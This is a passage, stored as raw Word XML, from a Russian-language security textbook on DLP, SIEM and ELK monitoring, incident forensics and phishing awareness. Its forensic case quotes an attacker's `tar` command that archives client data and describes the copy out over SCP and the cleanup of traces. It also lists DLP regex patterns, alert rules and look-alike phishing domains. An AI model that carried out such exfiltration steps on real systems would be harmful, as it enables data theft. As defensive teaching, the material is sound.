        <w:t>Мониторит трафик (email, веб, FTP, облачные сервисы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Блокирует отправку писем с номерами кредитных карт, паспортов, исходным кодом</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Сотрудник пытается отправить файл `clients.xlsx` на личный Gmail → DLP анализирует содержимое → обнаруживает номера телефонов/email → блокирует отправку + уведомляет администратора безопасности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Endpoint DLP** (на устройствах):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Блокирует копирование файлов на USB-флешки, внешние диски</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Блокирует печать конфиденциальных документов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Делает скриншоты экрана пользователя (для расследования)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Разработчик пытается скопировать папку с исходным кодом на USB → DLP блокирует + логирует попытку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Cloud DLP** (в облаке):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мониторит загрузку файлов в Google Drive, Dropbox, OneDrive</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Блокирует загрузку конфиденциальных данных в публичные облака</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Сотрудник загружает презентацию с пометкой "Confidential" в личный Dropbox → DLP блокирует.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Методы обнаружения конфиденциальных данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сигнатуры (регулярные выражения)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Номера кредитных карт: `\d{4}-\d{4}-\d{4}-\d{4}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Номера паспортов (РФ): `\d{4} \d{6}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Email: `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Классификация файлов**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файлы с пометкой "Confidential", "Top Secret" автоматически блокируются</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверка метаданных (например, файл создан в отделе финансов → считается конфиденциальным)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Machine Learning**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DLP анализирует, какие файлы обычно отправляются вне компании (пресс-релизы, публичная документация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обнаруживает аномалии: сотрудник никогда не отправлял файлы размером &gt;100 МБ → внезапно отправляет архив 500 МБ → алерт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Реальный пример DLP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кейс</w:t>
      </w:r>
      <w:r>
        <w:t>: Крупная IT-компания (назовём её TechCorp).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Увольняющиеся разработчики уносили исходный код (копировали на USB, отправляли себе на Gmail).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Установили **Endpoint DLP** на всех рабочих ноутбуках</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Заблокировали USB-порты (кроме клавиатуры/мыши)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Настроили правило: любой файл с расширением `.cpp`, `.h`, `.py` → блокировать копирование/отправку на внешние email</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Разрешили отправку исходного кода только на корпоративный GitLab</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: За год обнаружили </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>12 попыток утечки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (10 случайных, 2 злонамеренных). Уволили 2 сотрудников, остальным — предупреждение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стоимость DLP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: $50 000 в год (лицензия + администрирование)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стоимость одной утечки исходного кода</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (по оценкам): $500 000 - $5 000 000 (потеря конкурентного преимущества)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Окупилось.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4.4. Мониторинг и логирование: Кто что делал и когда</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если не логируешь — не сможешь расследовать инцидент. Если хакер украл данные 3 месяца назад — но ты не знаешь, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кто, когда и как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → ты в жопе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SIEM (Security Information and Event Management)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Система </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сбора, анализа и корреляции</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> логов из всех источников (серверы, файрволы, антивирусы, приложения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сбор логов**: агенты собирают логи с серверов, сетевых устройств, приложений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Нормализация**: разные форматы логов приводятся к единому виду</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Корреляция**: SIEM ищет паттерны (например, 10 неудачных попыток входа за минуту → возможна brute force атака)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Алерты**: уведомление администратору безопасности (email, SMS, Slack)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные SIEM:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Splunk** (коммерческий, дорогой, мощный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ELK Stack** (Elasticsearch, Logstash, Kibana) — open-source</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**IBM QRadar** (коммерческий, для enterprise)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Wazuh** (open-source, бесплатный)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример настройки ELK Stack для мониторинга</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Собирать логи с веб-сервера (nginx), анализировать, искать подозрительную активность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Установить Elasticsearch** (хранилище логов):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   sudo apt install elasticsearch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   sudo systemctl start elasticsearch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Установить Logstash** (сбор и обработка логов):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   sudo apt install logstash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   # Конфиг /etc/logstash/conf.d/nginx.conf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   input {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     file {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       path =&gt; "/var/log/nginx/access.log"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       start_position =&gt; "beginning"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   filter {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     grok {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       match =&gt; { "message" =&gt; "%{COMBINEDAPACHELOG}" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   output {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     elasticsearch {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       hosts =&gt; ["localhost:9200"]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   sudo systemctl start logstash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Установить Kibana** (визуализация):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   sudo apt install kibana</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   sudo systemctl start kibana</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   # Открыть http://localhost:5601</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Настроить алерты**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Правило: Если IP делает &gt;100 запросов в минуту → алерт (возможен DDoS или сканирование уязвимостей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Правило: Если статус 401 (Unauthorized) &gt;10 раз за минуту с одного IP → возможна brute force атака на логин</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Форензика (Forensics) — Расследование после инцидента</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Анализ логов, дампов памяти, файловой системы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>после атаки</w:t>
      </w:r>
      <w:r>
        <w:t>, чтобы понять:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как хакер проник в систему?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие данные украл?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Когда началась атака?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кто виноват?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример расследования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кейс</w:t>
      </w:r>
      <w:r>
        <w:t>: Компания обнаружила, что 50 ГБ данных клиентов исчезли с сервера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги форензики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Изолировать скомпрометированный сервер** (отключить от сети, но не выключать — иначе оперативная память сотрётся)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сделать дамп памяти** (RAM dump):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   sudo dd if=/dev/mem of=/tmp/memory.dump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проанализировать логи**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логи SSH: кто заходил и когда?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логи веб-сервера: были ли подозрительные запросы (SQL-инъекции, XSS)?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логи файловой системы: какие файлы изменялись/удалялись?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обнаружили**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 3:47 утра — вход по SSH с IP из Китая (но админ живёт в России)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IP принадлежит VPN-сервису → настоящий IP скрыт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использован украденный SSH-ключ (файл `id_rsa` был украден через фишинг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер выполнил команду: `tar -czf /tmp/data.tar.gz /var/www/clients/*`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Затем загрузил архив через SCP на свой сервер</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Удалил файл `/tmp/data.tar.gz` (чтобы скрыть следы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Выводы**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Виноват: админ, который кликнул на фишинговое письмо → украли SSH-ключ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Решение: отозвать все SSH-ключи, включить MFA для SSH, обучить персонал распознаванию фишинга</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4.5. Обучение персонала: Главная уязвимость — это ты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статистика</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**82%** утечек данных — из-за **человеческого фактора** (Verizon DBIR, 2023)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**30%** сотрудников кликают на фишинговые письма</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**60%** используют одинаковый пароль для рабочих и личных аккаунтов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Можно купить самый крутой firewall, установить DLP, настроить SIEM — но если сотрудник кликнет на "Ваш аккаунт заблокирован, нажмите здесь" → всё нахуй.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фишинг: Как распознать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Фишинг</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это письма/сообщения, которые притворяются легитимными (банк, HR-отдел, CEO), чтобы украсть пароли или заставить перевести деньги.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Признаки фишинга:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Подозрительный отправитель**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легит: `support@paypal.com`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фишинг: `support@paypa1.com` (единица вместо l), `support@paypal-secure.net`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Срочность и паника**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Ваш аккаунт будет заблокирован через 24 часа!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Подозрительная активность, нажмите здесь немедленно!"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Грамматические ошибки**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Ваша карта будет заблокированы" (множественное число)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Уважаемое клиент" (неправильный падеж)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Подозрительные ссылки**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Навести мышку на ссылку → в статус-баре браузера показывает реальный URL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легит: `https://paypal.com/login`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фишинг: `http://paypal-login.phishingsite.com`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Вложения**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.exe`, `.bat`, `.scr` — исполняемые файлы (вирусы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.docx`, `.pdf` с макросами — могут содержать вирусы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Реальный пример фишинга</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кейс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2016 году хакеры взломали почту </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Джона Подесты</w:t>
      </w:r>
